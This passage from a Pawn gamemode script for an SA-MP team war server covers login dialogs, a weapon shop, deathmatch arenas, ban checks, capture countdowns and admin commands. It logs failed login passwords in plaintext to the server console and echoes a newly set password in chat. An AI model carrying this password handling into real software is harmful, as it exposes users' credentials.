       	       } else return SendClientMessage(playerid,red,"Logged In As A Registered Player.");
	       }
	       else {
		       PlayerInfo[playerid][FailLogin]++;
		       printf("LOGIN: %s has failed to login, Wrong password (%s) Attempt (%d)", PlayerName2(playerid),inputtext, PlayerInfo[playerid][FailLogin] );
		       if(PlayerInfo[playerid][FailLogin] == MAX_FAIL_LOGINS)
		       {
			       new string[128]; format(string, sizeof(string), "%s Has Been Kicked From RWW2 Server Becuse He Failed To Login", PlayerName2(playerid) );
			       SendClientMessageToAll(C_PINK, string);
			       print(string);
			       Kick(playerid);
		           }
		      }
		}
		new string[200];
	    format(string, sizeof(string),""cwhite"Welcome "cred"%s "cwhite"you are already registered\nKindly enter password to login to your account\n"cred"Incorrect password!", PlayerName2(playerid));
		ShowPlayerDialog(playerid, 125, DIALOG_STYLE_INPUT, "Login",string,"Login","Kick");
	}
	case 126:
	{
       if(!response)
       {
         Kick(playerid);
       }
      if (strlen(inputtext) < 4 || strlen(inputtext) > 20) {
      	new string[200];
	  	format(string, sizeof(string),""cwhite"Welcome "cred"%s "cwhite"you are not registered\nKindly enter password to register your account\n"cred"Invalid password length", PlayerName2(playerid));
	   ShowPlayerDialog(playerid, 126, DIALOG_STYLE_INPUT, "Register",string,"Register","Kick");
	  }
      if (!udb_Exists(PlayerName2(playerid))) {
      if (udb_Create(PlayerName2(playerid),inputtext))
	  {
    	new file[256],name[MAX_PLAYER_NAME], tmp3[100];
    	new strdate[20], year,month,day;	getdate(year, month, day);
		GetPlayerName(playerid,name,sizeof(name)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(name));
     	GetPlayerIp(playerid,tmp3,100);	dini_Set(file,"ip",tmp3);
//    	dini_Set(file,"password",params);
	    dUserSetINT(PlayerName2(playerid)).("registered",1);
   		format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
		dini_Set(file,"RegisteredDate",strdate);
        dini_Set(file,"Nick",name);
		dUserSetINT(PlayerName2(playerid)).("loggedin",1);
		dUserSetINT(PlayerName2(playerid)).("banned",0);
		dUserSetINT(PlayerName2(playerid)).("level",0);
	    dUserSetINT(PlayerName2(playerid)).("LastOn",0);
    	dUserSetINT(PlayerName2(playerid)).("money",0);
		dUserSetINT(PlayerName2(playerid)).("Score",0);
    	dUserSetINT(PlayerName2(playerid)).("kills",0);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",0);
	   	dUserSetINT(PlayerName2(playerid)).("hours",0);
	   	dUserSetINT(PlayerName2(playerid)).("minutes",0);
	   	dUserSetINT(PlayerName2(playerid)).("seconds",0);
	   	dUserSetINT(PlayerName2(playerid)).("dRank",0);
	    PlayerInfo[playerid][LoggedIn] = 1;
	    PlayerInfo[playerid][Registered] = 1;
	    SendClientMessage(playerid, green, "You Are Now Registered, And Have Been Automaticaly Logged In!");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	  }
	 }
    }
*/
    case 183:
	{
        if(!response)
	    {
          ShowPlayerDialog(ID[playerid],183,DIALOG_STYLE_INPUT,"Password After Changing The Name","You Must Added A New Password For Your New Name\n{FF0000}Or Your Account Will Be Lost!","Set","");
        }
        new string[128];
		dUserSetINT(PlayerName2(ID[playerid])).("password_hash",udb_hash(inputtext) );
		PlayerPlaySound(ID[playerid],1057,0.0,0.0,0.0);
        format(string, sizeof(string),"You Have Successfully Changed Your Password To \"%s\"",inputtext);
	    SendClientMessage(ID[playerid],yellow,string);
	   }
	}
if(response)
    {
    switch(dialogid)
        {
		case 2:
    	    {
           	switch(listitem)
        	{
        	    case 0:
        	    {
                 	if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
                    GivePlayerMoney(playerid, -5000);
					SetPlayerHealth(playerid, 100.0);
					SendClientMessage(playerid, COLOR_WHITE, "You Bought Health Pack for $5000");
					}
        	    case 1:
        	    {
                    if(GetPlayerMoney(playerid) < 5500) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -5500);
        	        SetPlayerArmour(playerid, 100.0);
                     SendClientMessage(playerid, COLOR_WHITE, "You Bought Armour Pack for $5500");
        	    }
        	    case 2:
        	    {
        	        ShowPlayerDialog(playerid, 30, DIALOG_STYLE_LIST, "Weapons", "M4 - 8000$\nAK47 - 8000$\nMP5 - 6000$\nUZI - 12000$\nCombat Shotgun - 10000$\nShotgun - 5000$\nDesert Eagle - 6000$\nSilent Pistol - 3000$\nPistol - 3000$\nTec 9 - 3000$\nSawn-Off Shotgun - 8000$\nRPG - 10000$", "Buy", "Exit");
 	 			}
        	    case 3:
        	    {
				   if(AntiSK[playerid] == 0)
				   {
                        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                        GameTextForPlayer(playerid, "~r~use /kill~n~~w~to exit deathmatch~n~ ~r~stadium", 3000, 3);
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 299);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xFFFFFFFF);
	        	        SetPlayerPos(playerid, -1398.103515, 937.631164, 1036.479125);
	        	        SetPlayerInterior(playerid, 15);
	        	        DM[playerid] = Create3DTextLabel("Death-Match\nFighter", 0xFFFFFFFF, 30.0, 40.0, 50.0, 40.0, 0);
                        Attach3DTextLabelToPlayer(DM[playerid], playerid, 0.0, 0.0, 0.5);
						ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 24, 500);
						GivePlayerWeapon(playerid, 27, 500);
						GivePlayerWeapon(playerid, 31, 500);
						GivePlayerWeapon(playerid, 16, 1);
						GivePlayerWeapon(playerid, 10, 1);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						format(string, sizeof(string), "~y~%s Has Joined ~g~Deathmatch Stadium..", name);
	    				SendBoxMessage(string);
	    			}
	    			else return SendClientMessage(playerid, RED,"You cannot join DM while in AntiSK protection! Try again later");
           	 	}
              case 4:
        	    {
				   if(AntiSK[playerid] == 0)
				   {
                        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                        GameTextForPlayer(playerid, "~r~use /kill~n~~w~to exit deathmatch~n~ ~r~stadium", 3000, 3);
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 299);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xFFFFFFFF);
	        	        SetPlayerPos(playerid,-1401.067, 1265.3706, 1039.8672);
	        	        SetPlayerInterior(playerid,16);
	        	        DM[playerid] = Create3DTextLabel("Death-Match\nFighter", 0xFFFFFFFF, 30.0, 40.0, 50.0, 40.0, 0);
                        Attach3DTextLabelToPlayer(DM[playerid], playerid, 0.0, 0.0, 0.5);
						ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 24, 500);
						GivePlayerWeapon(playerid, 26, 500);
						GivePlayerWeapon(playerid, 32, 500);
						GivePlayerWeapon(playerid, 16, 1);
						GivePlayerWeapon(playerid, 9, 1);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						format(string, sizeof(string), "~y~%s Has Joined ~g~Deathmatch Stadium.", name);
	    				SendBoxMessage(string);
	    			}
	    			else return SendClientMessage(playerid, RED,"You cannot join DM while in AntiSK protection! Try again later");
           	 	}
           	case 5:
    		  {
 		  			if(GetPlayerMoney(playerid) < 50000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        			GivePlayerMoney(playerid, -50000);
    				if(License[playerid] == 1 || License[playerid] == 2)
					SendClientMessage(playerid, COLOR_WHITE, "You Already Have A license Or Its Been revoked Read /license");
					if(License[playerid] == 0)
					License[playerid] = 1;
					SendClientMessage(playerid, COLOR_WHITE, "You Bought A License Read license");
			  }
           	case 6:
    		  {
				   if(AntiSK[playerid] == 0)
				   {
                        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
                        GameTextForPlayer(playerid, "~r~use /kill~n~~w~to exit minigun~n~ ~r~stadium", 3000, 3);
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 299);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xFFFFFFFF);
	        	        MinigunDM[playerid] = 1;
	        	        SetPlayerPos(playerid, 249.64, 428.47, 1.57);
	        	        SetPlayerInterior(playerid, 15);
	        	        DM[playerid] = Create3DTextLabel("Minigun-Match\nFighter", 0xFFFFFFFF, 30.0, 40.0, 50.0, 40.0, 0);
                        Attach3DTextLabelToPlayer(DM[playerid], playerid, 0.0, 0.0, 0.5);
						ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 38, 50000);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						format(string, sizeof(string), "~y~%s Has Joined ~g~Minigun Stadium..", name);
	    				SendBoxMessage(string);
	    			}
	    			else return SendClientMessage(playerid, RED,"You cannot join DM while in AntiSK protection! Try again later");
			  }
			  
    		  
        	}
    	    }
	}
    }
if(response)
{
    switch(dialogid)
    {
		case 30:
  		{
           	switch(listitem)
        	{
        	    case 0:
        	    {
                 	if(GetPlayerMoney(playerid) < 8000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -8000);
        	        GivePlayerWeapon(playerid, 31, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought An M4");
        	    }
        	    case 1:
        	    {
                 	if(GetPlayerMoney(playerid) < 8000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -8000);
        	        GivePlayerWeapon(playerid, 30, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought An AK 47");
        	    }
        	    case 2:
        	    {
                 	if(GetPlayerMoney(playerid) < 6000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -6000);
        	        GivePlayerWeapon(playerid, 29, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought An MP5");
        	    }
        	    case 3:
        	    {
                 	if(GetPlayerMoney(playerid) < 12000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -12000);
        	        GivePlayerWeapon(playerid, 28, 500);
					SendClientMessage(playerid, 0xFFFFFF, "You bought An UZI");
        	    }
        	    case 4:
        	    {
                 	if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -10000);
        	        GivePlayerWeapon(playerid, 27, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought A Combat Shotgun");
        	    }
        	    case 5:
        	    {
                 	if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -5000);
        	        GivePlayerWeapon(playerid, 25, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought A Shotgun");
        	    }
        	    case 6:
        	    {
                 	if(GetPlayerMoney(playerid) < 6000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -6000);
        	        GivePlayerWeapon(playerid, 24, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought A Desert Eagle");
        	    }
        	    case 7:
        	    {
                 	if(GetPlayerMoney(playerid) < 3000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -3000);
        	        GivePlayerWeapon(playerid, 23, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought A Silencer");
        	    }
        	    case 8:
        	    {
                 	if(GetPlayerMoney(playerid) < 3000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -3000);
        	        GivePlayerWeapon(playerid, 22, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought A Pistol");
                 }
                 case 9:
        	     {
                 	if(GetPlayerMoney(playerid) < 3000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -3000);
        	        GivePlayerWeapon(playerid, 32, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought A Tec 9");
        	    }
        	    case 10:
        	     {
                 	if(GetPlayerMoney(playerid) < 8000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -8000);
        	        GivePlayerWeapon(playerid, 26, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought A Sawn Off Shotgun");
        	    }
        	    case 11:
        	    {
                 	if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid, 0xFF0000AA, "You Don't Have Enough Cash To Do This.");
        	        GivePlayerMoney(playerid, -10000);
        	        GivePlayerWeapon(playerid, 35, 1);
					SendClientMessage(playerid, 0xFFFFFF, "You bought An RPG");
					}
        	}
    	    }
	}
    }
	return 1;
}
forward CheckBanFromFile(playerid);
public CheckBanFromFile(playerid)
{
new file[200], string[200], aname[25], pname[24], name[256], reason[250];
GetPlayerName(playerid, name, sizeof(name));
format(file, sizeof(file),"ladmin/bans/%s.ini",name);
if(INI_Exist(file))
{
INI_Open(file);
INI_ReadString(aname,"Admin",256);
INI_ReadString(pname,"Player", 256);
INI_ReadString(reason,"Reason",256);
format(string, sizeof(string),""cwhite"AdminName: "cyellow"%s\n \n"cwhite"YourName: "cyellow"%s\n \n"cwhite"Reason of ban: "cred"%s\n \n"cred"if this is a mistake you can kindly take picture of this and post at our forums\n \n"cred"xenon-extreme.com",aname, pname, reason);
ShowPlayerDialog(playerid, 1500, DIALOG_STYLE_MSGBOX,""cred"You are Banned from COD-RWW2!",string,"Close","");
Kick(playerid);
INI_Close();
}
return 1;
}
forward CheckBan(playerid);
public CheckBan(playerid) {
new file[200], string[200], aname[25], pname[24], reason[250], user[256], un[256];
GetPlayerName(playerid, un, sizeof(un));
format(user, sizeof(user),"ladmin/users/%s.ini", un);
INI_Open(user);
if(INI_ReadInt("Banned") == 1) {
{
INI_Open(file);
INI_ReadString(aname,"Admin",256);
INI_ReadString(pname,"Player", 256);
INI_ReadString(reason,"Reason",256);
format(string, sizeof(string),""cwhite"AdminName: "cyellow"%s\n \n"cwhite"YourName: "cyellow"%s\n \n"cwhite"Reason of ban: "cred"%s\n \n"cred"if this is a mistake you can kindly take picture of this and post at our forums\n \n"cred"xenon-extreme.com",aname, pname, reason);
ShowPlayerDialog(playerid, 1500, DIALOG_STYLE_MSGBOX,""cred"You are Banned from COD-RWW2!",string,"Close","");
Kick(playerid);
INI_Close();
INI_Close();
}
}
return 1;
}
forward CountDown();
public CountDown()
{
	foreach(Player, playerid)
	{
		if(IsPlayerInDynamicCP(playerid, CP[SNAKE]) && UnderAttack[SNAKE] == 1 && IsPlayerCapturing[playerid][SNAKE] == 1)
		{
			CountVar[playerid][SNAKE]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][SNAKE]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[BAY]) && UnderAttack[BAY] == 1 && IsPlayerCapturing[playerid][BAY] == 1)
		{
			CountVar[playerid][BAY]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][BAY]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[BIG]) && UnderAttack[BIG] == 1 && IsPlayerCapturing[playerid][BIG] == 1)
		{
			CountVar[playerid][BIG]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][BIG]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[ARMY]) && UnderAttack[ARMY] == 1 && IsPlayerCapturing[playerid][ARMY] == 1)
		{
			CountVar[playerid][ARMY]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][ARMY]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[PETROL]) && UnderAttack[PETROL] == 1 && IsPlayerCapturing[playerid][PETROL] == 1)
		{
			CountVar[playerid][PETROL]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][PETROL]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[OIL]) && UnderAttack[OIL] == 1 && IsPlayerCapturing[playerid][OIL] == 1)
		{
			CountVar[playerid][OIL]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][OIL]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[DESERT]) && UnderAttack[DESERT] == 1 && IsPlayerCapturing[playerid][DESERT] == 1)
		{
			CountVar[playerid][DESERT]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][DESERT]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[QUARRY]) && UnderAttack[QUARRY] == 1 && IsPlayerCapturing[playerid][QUARRY] == 1)
		{
			CountVar[playerid][QUARRY]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][QUARRY]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[GUEST]) && UnderAttack[GUEST] == 1 && IsPlayerCapturing[playerid][GUEST] == 1)
		{
			CountVar[playerid][GUEST]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][GUEST]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[EAR]) && UnderAttack[EAR] == 1 && IsPlayerCapturing[playerid][EAR] == 1)
		{
			CountVar[playerid][EAR]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d ~y~Left To Capture.", CountVar[playerid][EAR]);
			TextDrawSetString(CountText[playerid], str1);
		}
	}
	return 1;
}
stock GetTeamName(playerid)
{
	new str[66];
	if(gTeam[playerid] == TEAM_EURASIA) str =  ("Eurasia");
	else if(gTeam[playerid] == TEAM_ARAB) str =  ("Arabian");
	else if(gTeam[playerid] == TEAM_SOVIET) str =  ("Soviet");
	else if(gTeam[playerid] == TEAM_USA) str =  ("USA");
	else if(gTeam[playerid] == TEAM_AUS) str =  ("Australia");
	else if(gTeam[playerid] == TEAM_MERC) str =  ("Mercenary");
	else if(gTeam[playerid] == TEAM_MARVEL) str =  ("Vietnam");
	return str;
}
//==============SendTeamMessage function by Jarnu==============================
stock SendTeamMessage(teamid, color, string[])
{
  	foreach(Player, x)
	{
		if(IsPlayerConnected(x))
		{
	  		if(gTeam[x] == teamid)
	  		{
				SendClientMessage(x, color, string);
	  		}
		}
  	}
  	return 1;
}
//=======================Give Team Score by Jarnu==============================
stock GiveTeamScore(teamid, amount)
{
  	foreach(Player, x)
	{
		if(IsPlayerConnected(x))
		{
	  		if(gTeam[x] == teamid)
	  		{
				SetPlayerScore(x, GetPlayerScore(x)+amount);
	  		}
		}
  	}
 	return 1;
}
//==============================================================================

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	return 1;
}
stock GetTeamCount(teamid)
{
   new playercount = 0;//Set our count to 0 as we have not counted any players yet..
    foreach(Player, i)
	{//Loop through MAX_PLAYERS(I suggest you redefine MAX_PLAYERS to ensure max efficency).. eat foreach whoever said that..
        if(GetPlayerState(i) == PLAYER_STATE_NONE) continue;//If a player is in class selection continue..
        if(gTeam[i] != teamid) continue;//If a player is NOT in the specified teamid continue..
        playercount++;//else (there in the teamid) so count the player in the team..
    }
    return playercount;//Return the total players counted in the specified team..
}
////////////////////////////////////////////////////////////////////////
CMD:irc(playerid, params[])
{
	new string[128];
	new endid;
	if(!strlen(params))
	{
	    IRC_GroupSay(gGroupID, IRC_CHANNEL,"USAGE: /ircpm (Message)");
	    return 1;
	}
    format(string, sizeof(string), "10,1[IRC PM] %s(%d): %s",PlayerName2(playerid),playerid,params);
    IRC_GroupSay(gGroupID, IRC_CHANNEL,string);

	format(string, sizeof(string), "[IRC PM] %s(%d): %s",PlayerName2(playerid),endid,params);
 	SendClientMessage(playerid,C_PINK,string);
    return 1;
}
CMD:getbots(playerid, params[])
{
 	if(PlayerInfo[playerid][LoggedIn] == 1)
	{
		if(PlayerInfo[playerid][Level] >= 6)
		{
	        gBotID[0] = IRC_Connect(IRC_SERVER, IRC_PORT, BOT_1_NICKNAME, BOT_1_REALNAME, BOT_1_USERNAME);
            IRC_SetIntData(gBotID[0], E_IRC_CONNECT_DELAY, 20);
			gBotID[1] = IRC_Connect(IRC_SERVER, IRC_PORT, BOT_2_NICKNAME, BOT_2_REALNAME, BOT_2_USERNAME);
			IRC_SetIntData(gBotID[1], E_IRC_CONNECT_DELAY, 30);
			gBotID[2] = IRC_Connect(IRC_SERVER, IRC_PORT, BOT_3_NICKNAME, BOT_3_REALNAME, BOT_3_USERNAME);
			IRC_SetIntData(gBotID[2], E_IRC_CONNECT_DELAY, 30);
			gGroupID = IRC_CreateGroup();

 	    }
 	
 	}
}

CMD:teams(playerid, params[])
{
   new team1count = GetTeamCount(TEAM_EURASIA);
   new team2count = GetTeamCount(TEAM_USA);
   new team3count = GetTeamCount(TEAM_ARAB);
   new team4count = GetTeamCount(TEAM_SOVIET);
   new team5count = GetTeamCount(TEAM_AUS);
   new team6count = GetTeamCount(TEAM_MARVEL);
   new str[500];
   new str2[500];
   format(str, sizeof(str),""cgreen"Eurasia: "cwhite"%d Players\n\n", team1count);
   strcat(str2, str);
   format(str, sizeof(str),""cyellow"Arabia: "cwhite"%d Players\n\n", team3count);
   strcat(str2, str);
   format(str, sizeof(str),""cblue"USA: "cwhite"%d Players\n\n", team2count);
   strcat(str2, str);
   format(str, sizeof(str),""cred"Russia: "cwhite"%d Players\n\n", team4count);
   strcat(str2, str);
   format(str, sizeof(str),""cpurple"Australia: "cwhite"%d Players\n\n", team5count);
   strcat(str2, str);
   format(str, sizeof(str),""ccolor"Vietnam: "cwhite"%d Players\n\n", team6count);
   strcat(str2, str);
   	ShowPlayerDialog(playerid, 805, DIALOG_STYLE_MSGBOX, ""cwhite"RWW2-Teams", str2, "Close", "");
	return 1;
}

CMD:undis(playerid, params[])
{
    if(IsPlayerConnected(playerid))
	{
    	if(gClass[playerid] == AG)
	    {
		    		if(gTeam[playerid] == TEAM_USA)
	                {
	                    SetPlayerSkin(playerid, 287);
		                SetPlayerColor(playerid, TEAM_USA_COLOR);
		                Update3DTextLabelText(Dis[playerid], 0xFFFFFFFF, " ");
		                UpdateLabelText(playerid);
		                SCM(playerid,grey,"Undis");
		            }
	                if(gTeam[playerid]== TEAM_EURASIA)
	                {
	                    SetPlayerSkin(playerid, 73);
		                SetPlayerColor(playerid, TEAM_EURASIA_COLOR);
		                Update3DTextLabelText(Dis[playerid], 0xFFFFFFFF, " ");
		                UpdateLabelText(playerid);
		                SCM(playerid,grey,"Undis");
			        }
			        if(gTeam[playerid] == TEAM_ARAB)
	                {
	                    SetPlayerSkin(playerid, 179);
		                SetPlayerColor(playerid, TEAM_ARAB_COLOR);
		                Update3DTextLabelText(Dis[playerid], 0xFFFFFFFF, " ");
		                UpdateLabelText(playerid);
		                SCM(playerid,grey,"Undis");
			        }
			        if(gTeam[playerid] == TEAM_SOVIET)
	                {
	                    SetPlayerSkin(playerid, 285);
	                	SetPlayerColor(playerid, TEAM_SOVIET_COLOR);
	                	Update3DTextLabelText(Dis[playerid], 0xFFFFFFFF, " ");
	                	UpdateLabelText(playerid);
	                	SCM(playerid,grey,"Undis");

			        }
           			if(gTeam[playerid] == TEAM_MARVEL)
	                {
	                    SetPlayerSkin(playerid, 122);
	                	SetPlayerColor(playerid, TEAM_MARVEL_COLOR);
	                	Update3DTextLabelText(Dis[playerid], 0xFFFFFFFF, " ");
	                	UpdateLabelText(playerid);
	                	SCM(playerid,grey,"Undis");

			        }
			        if(gTeam[playerid] == TEAM_AUS)
	                {
	                    SetPlayerSkin(playerid, 206);
	                	SetPlayerColor(playerid, TEAM_AUS_COLOR);
	                	Update3DTextLabelText(Dis[playerid], 0xFFFFFFFF, " ");
	                	UpdateLabelText(playerid);
	                	SCM(playerid,grey,"Undis");
					}
        }else SendClientMessage(playerid, red, "You Need To Be A Spy To Use This Command.");
	}else return false;
	return 1;
}


CMD:givegun(playerid, params[])
{
	new playername[24];
	new weaponname[65], player2name[MAX_PLAYER_NAME];
	new playermsg[128], player2msg[128];
   	new tmp[256];
   	new idx;
   	tmp = strtok(params, idx);
	if(!strlen(tmp))
	{
		SendClientMessage(playerid, red, "JikyBot: Usage:/givegun [playerid]");
   		return 1;
   	}

    new player2id = strval(tmp);

	if(IsPlayerConnected(player2id))
	{
    	if(player2id==playerid)
      	{
     		SendClientMessage(playerid, red, "You Gave An Invalid ID. Give Me A Correct ID!");
        	return 1;
        }
        else
		{
            new weaponid = GetPlayerWeapon(playerid);
            new weaponammo;
            if(weaponid == 0)
            {
              	SendClientMessage(playerid, red, "You're Not Holding A Damn Weapon");
              	return 1;
            }
            else
			{
           		new weapo[13][2];
               	for(new i;i<13;i++)
               	{
               		GetPlayerWeaponData(playerid, i, weapo[i][0], weapo[i][1]);
               		if(weapo[i][0]==weaponid) weaponammo=weapo[i][1];
               	}

               	new Float:gX, Float:gY, Float:gZ;
		    	GetPlayerPos(player2id, gX, gY, gZ);
		    	if( !IsPlayerInRangeOfPoint(playerid, 5.0, gX, gY, gZ) )
		    	{
		    	    SendClientMessage(playerid, C_PINK, "Player  Is 1 Mile Away! He Has To Be Near You!");
		    	    return 1;
		    	}
               	ResetPlayerWeapons(playerid);
               	for(new i;i<13;i++) if(weapo[i][0]!=weaponid) GivePlayerWeapon(playerid, weapo[i][0], weapo[i][1]);
               	GivePlayerWeapon(player2id, weaponid, weaponammo);

               	GetWeaponName(weaponid, weaponname, 64);
               	GetPlayerName(playerid, playername, sizeof(playername));
               	GetPlayerName(player2id, player2name, sizeof(player2name));

               	format(playermsg, 255, "You gave your %s to %s(%d)", weaponname, player2name, player2id);
               	SendClientMessage(playerid, COLOR_YELLOW, playermsg);

               	format(player2msg, 255, "You recived a %s from %s(%d)", weaponname, playername, playerid);
               	SendClientMessage(player2id, COLOR_YELLOW, player2msg);
			}
		}
	}
  	else
    {
    	SendClientMessage(playerid, red, "That Player Is Not Connected.");
	}
	return 1;
}
CMD:getteam(playerid, params[])
{
   if(PlayerInfo[playerid][Level] >= 4)
   {
	   new team[100], Float:x, Float:y, Float:z, interior = GetPlayerInterior(playerid), world = GetPlayerVirtualWorld(playerid);
	   if(sscanf(params,"s[100]",team)) return SendClientMessage(playerid, RED,"JikyBot: Usage:/getteam [teamname USA/Eurasia/Arabia/Soviet/Vietnam/Australia]");
	   GetPlayerPos(playerid, x, y, z);
	   //---------USA------------------------
	   if(strfind(params,"USA",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   	if(gTeam[i] == TEAM_USA)
			   	{
				   	SetPlayerInterior(i, interior);
				   	SetPlayerVirtualWorld(i, world);
				   	SetPlayerPos(i, x+3, y, z);
				   	TogglePlayerControllable(i, false);
				   	PlayerInfo[i][Frozen] = 1;
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   }


	   //---------------------------------
    	if(strfind(params,"Vietnam",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   	{
		   	foreach(Player, i)
			{
			   	if(gTeam[i] == TEAM_MARVEL)
			   	{
				   	SetPlayerInterior(i, interior);
				   	SetPlayerVirtualWorld(i, world);
				   	SetPlayerPos(i, x+3, y, z);
				   	TogglePlayerControllable(i, false);
				   	PlayerInfo[i][Frozen] = 1;
			   	}
		   	}
		   	new string[100];
		   	format(string,sizeof(string),"Team %s Has Been Telepoted By Administrator %s",PlayerName2(playerid),params);
		   	SendClientMessageToAll(C_PINK, string);
	   	}
	   //--------Eurasia----------------
	   if(strfind(params,"Eurasia",true) != -1) //Returns 4 (Thanks to wiki for helping in strfind).
	   {
		   	foreach(Player, i)
			{
			   	if(gTeam[i] == TEAM_EURASIA)
			   	{
				   	SetPlayerPos(i, x+3, y, z);
				   	SetPlayerInterior(i, interior);
				   	SetPlayerVirtualWorld(i, world);
				   	TogglePlayerControllable(i, false);
				   	PlayerInfo[i][Frozen] = 1;
			   	}
		   	}
		   	new string[100];
